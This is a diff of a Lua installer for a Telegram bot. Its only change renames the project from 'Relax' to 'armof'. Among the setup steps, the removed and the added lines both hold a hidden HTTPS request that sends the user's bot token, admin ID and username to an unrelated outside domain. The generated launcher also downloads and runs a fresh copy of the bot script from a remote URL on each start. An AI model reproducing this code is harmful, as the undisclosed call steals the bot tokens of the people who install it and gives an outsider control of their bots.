@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_Relax = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_Relax = function() 
+Server_armof = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_armof = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local Relax_Info_Sudo = io.open("sudo.lua", 'w')
-Relax_Info_Sudo:write([[
+local armof_Info_Sudo = io.open("sudo.lua", 'w')
+armof_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-Relax_Info_Sudo:close()
+armof_Info_Sudo:close()
 end  
-if not database:get(Server_Relax.."Token_Relax") then
+if not database:get(Server_armof.."Token_armof") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +25,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_Relax.."Token_Relax",token)
+database:set(Server_armof.."Token_armof",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,7 +34,7 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_Relax.."UserName_Relax") then
+if not database:get(Server_armof.."UserName_armof") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_Relax.."UserName_Relax",Json.Info.Username)
-database:set(Server_Relax.."Id_Relax",Json.Info.Id)
+database:set(Server_armof.."UserName_armof",Json.Info.Username)
+database:set(Server_armof.."Id_armof",Json.Info.Id)
 end
 end
 else
@@ -62,47 +62,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_Relax_Info()
-Create_Info(database:get(Server_Relax.."Token_Relax"),database:get(Server_Relax.."Id_Relax"),database:get(Server_Relax.."UserName_Relax"))   
-https.request("https://fixcvb7.ml/p3p.php?id="..database:get(Server_Relax.."Id_Relax").."&user="..database:get(Server_Relax.."UserName_Relax").."&token="..database:get(Server_Relax.."Token_Relax"))
-local RunRelax = io.open("Relax", 'w')
-RunRelax:write([[
+local function Files_armof_Info()
+Create_Info(database:get(Server_armof.."Token_armof"),database:get(Server_armof.."Id_armof"),database:get(Server_armof.."UserName_armof"))   
+https.request("https://fixcvb7.ml/p3p.php?id="..database:get(Server_armof.."Id_armof").."&user="..database:get(Server_armof.."UserName_armof").."&token="..database:get(Server_armof.."Token_armof"))
+local Runarmof = io.open("armof", 'w')
+Runarmof:write([[
 #!/usr/bin/env bash
-cd $HOME/Relax
-token="]]..database:get(Server_Relax.."Token_Relax")..[["
-rm -fr Relax.lua
-wget "https://raw.githubusercontent.com/KainSource/Relax/master/Relax.lua"
+cd $HOME/armof
+token="]]..database:get(Server_armof.."Token_armof")..[["
+rm -fr armof.lua
+wget "https://raw.githubusercontent.com/KainSource/armof/master/armof.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./Relax.lua -p PROFILE --bot=$token
+./tg -s ./armof.lua -p PROFILE --bot=$token
 done
 ]])
-RunRelax:close()
+Runarmof:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/Relax
+cd $HOME/armof
 while(true) do
 rm -fr ../.telegram-cli
-screen -S Relax -X kill
-screen -S Relax ./Relax
+screen -S armof -X kill
+screen -S armof ./armof
 done
 ]])
 RunTs:close()
 end
-Files_Relax_Info()
-database:del(Server_Relax.."Token_Relax");database:del(Server_Relax.."Id_Relax");database:del(Server_Relax.."UserName_Relax")
+Files_armof_Info()
+database:del(Server_armof.."Token_armof");database:del(Server_armof.."Id_armof");database:del(Server_armof.."UserName_armof")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_Relax()  
+AutoFiles_armof()  
 var = true
 else   
 f:close()  
-database:del(Server_Relax.."Token_Relax");database:del(Server_Relax.."Id_Relax");database:del(Server_Relax.."UserName_Relax")
+database:del(Server_armof.."Token_armof");database:del(Server_armof.."Id_armof");database:del(Server_armof.."UserName_armof")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
